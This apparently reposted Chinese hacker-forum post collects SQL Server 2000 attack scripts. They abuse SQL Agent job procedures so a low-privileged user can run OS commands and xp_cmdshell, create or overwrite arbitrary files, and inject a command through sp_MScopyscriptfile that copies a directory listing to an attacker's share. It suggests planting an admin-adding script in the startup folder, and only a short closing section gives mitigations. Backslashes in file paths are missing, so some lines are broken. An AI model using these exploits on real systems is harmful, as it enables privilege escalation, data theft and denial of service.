@@ -1,0 +1,138 @@
+
+
+
+貌似现在大多数的修复指令都是 use master
+看看下面的这些利用代码 
+还没测试 但是这帖子发布在07年 但是利用的人不多，很纳闷为什么啊
+再废话几句 希望能帮到大家
+下面的可能知道的人就少了:) 
+------------------------------------------ 
+
+
+use msdb; --这儿不要是master哟 
+exec sp_add_job @job_name=‘czy82‘; 
+exec sp_add_jobstep @job_name=‘czy82‘,@step_name = ‘Exec my sql‘,@subsystem=‘CMDEXEC‘,@command=‘dir c:>c:b.txt‘; 
+exec sp_add_jobserver @job_name = ‘czy82‘,@server_name = ‘smscomputer‘; 
+exec sp_start_job @job_name=‘czy82‘; 
+
+利用MSSQL的作业处理也是可以执行命令的而且如果上面的subsystem的参数是tsql，后面的我们就可以 
+执行tsql语句了. 
+对于这几个储存过程的使用第一在@server_name我们要指定你的sql的服务器名 
+第二系统的sqlserveragent服务必须打开(默认没打开的气人了吧) 
+net start SQLSERVERAGENT 
+
+对于这个东东还有一个地方不同就是public也可以执行..同这儿也是有系统洞洞的看下面的 
+USE msdb 
+EXEC sp_add_job @job_name = ‘GetSystemOnSQL‘, 
+@enabled = 1, 
+@description = ‘This will give a low privileged user access to 
+xp_cmdshell‘, 
+@delete_level = 1 
+EXEC sp_add_jobstep @job_name = ‘GetSystemOnSQL‘, 
+@step_name = ‘Exec my sql‘, 
+@subsystem = ‘TSQL‘, 
+@command = ‘exec master..xp_execresultset N‘‘select ‘‘‘‘exec 
+master..xp_cmdshell "dir > c:agent-job-results.txt"‘‘‘‘‘‘,N‘‘Master‘‘‘ 
+EXEC sp_add_jobserver @job_name = ‘GetSystemOnSQL‘, 
+@server_name = ‘你的SQL的服务器名‘ 
+EXEC sp_start_job @job_name = ‘GetSystemOnSQL‘ 
+
+不要怀疑上面的代码，我是测试成功了的!这儿我们要注意xp_execresultset就是因为它所以 
+才让我们可以以public执行xp_cmdshell 
+
+
+5)关于Microsoft SQL Agent Jobs任意文件可删除覆盖漏洞(public用户也可以) 
+在安焦有文章:http://www.xfocus.net/vuln/vul_view.php?vul_id=2968 
+
+USE msdb 
+EXEC sp_add_job @job_name = ‘ArbitraryFileCreate‘, 
+@enabled = 1, 
+@description = ‘This will create a file called c:sqlafc123.txt‘, 
+@delete_level = 1 
+EXEC sp_add_jobstep @job_name = ‘ArbitraryFileCreate‘, 
+@step_name = ‘SQLAFC‘, 
+@subsystem = ‘TSQL‘, 
+@command = ‘select ‘‘hello, this file was created by the SQL Agent.‘‘‘, 
+@output_file_name = ‘c:sqlafc123.txt‘ 
+EXEC sp_add_jobserver @job_name = ‘ArbitraryFileCreate‘, 
+@server_name = ‘SERVER_NAME‘ 
+EXEC sp_start_job @job_name = ‘ArbitraryFileCreate‘ 
+
+如果subsystem选的是:tsql，在生成的文件的头部有如下内容 
+
+??揂rbitraryFileCreate? ? 1 ?,揝QLAFC? ???? 2003-02-07 18:24:19 
+---------------------------------------------- 
+hello, this file was created by the SQL Agent. 
+
+(1 ?????) 
+
+所以我建议要生成文件最好subsystem选cmdexec,如果利用得好我们可以写一个有添加管理员 
+命令的vbs文件到启动目录! 
+
+6)关于sp_makewebtask(可以写任意内容任意文件名的文件) 
+关于sp_MScopyscriptfile 看下面的例子 
+declare @command varchar(100) 
+declare @scripfile varchar(200) 
+set concat_null_yields_null off 
+select @command=‘dir c: > "attackeripsharedir.txt"‘ 
+select @scripfile=‘c:autoexec.bat > nul" | ‘ + @command + ‘ | rd "‘ 
+exec sp_MScopyscriptfile @scripfile ,‘‘ 
+
+这两个东东都还在测试试哟 
+
+
+-------------------------------------------------- 
+写了这么多好象不只是写如何执行程序了，反正就到这儿吧:) 
+-------------------------------------------------- 
+
+
+
+
+------------------------------------------------
+
+add:
+
+Microsoft SQL Server 2000使用一代理负责重新启动SQL SERVER服务，复制和运行定制的工作。
+
+当增加一工作时，可指定文件名来输出Transact-SQL或者CmdExec JOB的结果，如果指定的文件已经存在就会被覆盖，而如果文件不存在就会建立新的文件。通过构造特殊的JOB查询可以生成指定内容的文件。
+
+如果SQL Server Agent运行在SYSTEM权限下，攻击者可以覆盖重要的操作系统文件而使系统不能启动。
+
+测试代码
+-- ArbitraryFileCreate
+-- For this to work the SQL Agent should be running.
+-- Further, you'll need to change SERVER_NAME in
+-- sp_add_jobserver to the SQL Server of your choice
+--
+-- David Litchfield
+-- (david@ngssoftware.com)
+-- 19th August 2002
+
+USE msdb
+
+EXEC sp_add_job @job_name = 'ArbitraryFileCreate',
+@enabled = 1,
+@description = 'This will create a file called c:sqlafc123.txt',
+@delete_level = 1
+
+EXEC sp_add_jobstep @job_name = 'ArbitraryFileCreate',
+@step_name = 'SQLAFC',
+@subsystem = 'TSQL',
+@command = 'select ''hello, this file was created by the SQL Agent.''',
+@output_file_name = 'c:sqlafc123.txt'
+
+EXEC sp_add_jobserver @job_name = 'ArbitraryFileCreate',
+@server_name = 'SERVER_NAME'
+
+EXEC sp_start_job @job_name = 'ArbitraryFileCreate'
+
+解决方案
+防止低用户提交作业，需要限制用户访问JOB相关的存储过程：
+
+sp_add_job
+sp_add_jobstep
+sp_add_jobserver
+sp_start_job
+
+确保SQL Server Agent运行在低权限下
+本文来自: 华夏黑客同盟论坛 本文详细地址：http://bbs.77169.com/read.php?tid=305598
